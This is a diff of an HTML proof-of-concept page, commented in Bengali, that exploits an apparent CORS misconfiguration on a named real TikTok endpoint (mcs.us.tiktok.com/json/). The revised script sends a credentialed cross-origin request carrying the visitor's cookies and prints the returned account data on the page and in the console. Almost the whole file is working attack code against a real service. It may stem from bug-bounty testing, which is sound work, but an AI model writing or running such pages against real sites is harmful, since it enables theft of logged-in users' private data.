@@ -2,39 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS Exploit PoC</title>
+    <title>CORS Exploit PoC - pagolmoon3</title>
 </head>
 <body>
     <h2>CORS Misconfiguration Proof of Concept</h2>
-    <p>Attempting to extract sensitive data from mcs.us.tiktok.com...</p>
+    <p>Status: <span id="status">Testing...</span></p>
+    <pre id="output"></pre>
 
     <script>
-        // যে এন্ডপয়েন্টটিতে আমরা CORS মিসকনফিগারেশন পেয়েছি
-        const targetUrl = "https://mcs.us.tiktok.com/";
+        // যে এন্ডপয়েন্টটি আপনি বার্পস্যুটে টেস্ট করেছেন
+        const targetUrl = "https://mcs.us.tiktok.com/json/"; 
 
         function exploit() {
+            const output = document.getElementById("output");
+            const status = document.getElementById("status");
+            
             var req = new XMLHttpRequest();
             
-            // রিকোয়েস্ট ওপেন করছি
             req.open("GET", targetUrl, true);
             
-            // এটিই সবচেয়ে গুরুত্বপূর্ণ লাইন: এটি ব্রাউজারকে বাধ্য করে ইউজারের কুকি সাথে পাঠাতে
+            // Credential true থাকার কারণেই আমরা ইউজারের কুকি রিড করতে পারছি
             req.withCredentials = true; 
             
             req.onload = function() {
                 if (req.status === 200) {
-                    // সফল হলে রেসপন্সটি পপআপে দেখাবে
-                    alert("Data Extracted Successfully:\n\n" + this.responseText);
+                    status.innerText = "Success! Data Extracted:";
+                    output.innerText = this.responseText;
                     console.log("Extracted Data:", this.responseText);
+                    alert("Data Extracted Successfully!");
                 } else {
-                    // ফেইল করলে স্ট্যাটাস কোড দেখাবে
-                    alert("Failed to extract data. Status: " + req.status);
+                    status.innerText = "Failed with status: " + req.status;
+                    output.innerText = this.responseText;
                 }
             };
             
             req.onerror = function() {
-                // CORS পলিসি বা নেটওয়ার্ক এরর হলে এখানে আসবে
-                alert("Request failed! The CORS policy might be blocking the request or credentials are not being sent.");
+                status.innerText = "Request failed! CORS policy might be blocking.";
             };
             
             req.send();
